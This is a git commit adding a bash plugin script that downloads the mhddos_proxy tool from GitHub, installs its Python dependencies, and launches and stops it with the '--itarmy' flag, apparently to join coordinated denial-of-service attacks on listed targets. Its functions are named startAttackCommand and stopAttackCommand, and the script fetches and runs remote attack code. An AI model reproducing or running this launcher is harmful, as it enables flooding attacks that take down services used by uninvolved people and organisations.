79b8a73cb4d95afe9a2448c5db78fe27e873d9e1
os <ukrainger@gmail.com>
2022-07-02 05:24:24 -0400

    Experimental plugin support for MHDDOS

---
+++ plugins/plugin_exe_mhddos.sh
@@ -0,0 +1,86 @@
+#!/bin/bash
+
+
+#checking for installation
+#виконавча програма
+EXEDir=mhddos_proxy
+EXE=mhddos
+
+
+############### functions ##################################
+
+function statusAttackCommand {
+
+    pgrep -f "$EXE" > /dev/null; echo $(($?==0));
+
+}
+
+function startAttackProxyCommand {
+
+    cd $EXEDir
+
+    python3 runner.py --itarmy "${EXE}"&
+
+    cd ..
+
+}
+ 
+function startAttackCommand {
+
+    cd $EXEDir
+
+    python3 runner.py --itarmy --vpn "${EXE}"&
+
+    cd ..
+
+}
+
+function stopAttackCommand {
+
+    pgrep -f "$EXE" | xargs pkill -TERM -P
+
+    sleep 2s;
+
+}
+
+
+############################################################
+
+
+############### init #######################################
+
+function initEXECommand {
+
+    if $forceExeReinstall ; then
+
+        echo "Forcing exe reinstall -> will delete the folder $EXEDir"
+        rm -r "$EXEDir"
+
+    fi
+
+    #download and install the EXE if not available
+    if [ -d "$EXEDir" ]
+    then
+
+        echo "$EXEDir already exists -> nothing to do."
+
+    else
+
+        echo "Exe dir does not exist -> will create one by checking out from GIT..."
+
+        git clone https://github.com/porthole-ascend-cinnamon/$EXEDir
+
+        cd $EXEDir;
+
+        python3 -m pip install -r requirements.txt
+
+        cd ..;
+
+        sleep 2s;
+
+    fi
+
+}
+
+############################################################
+
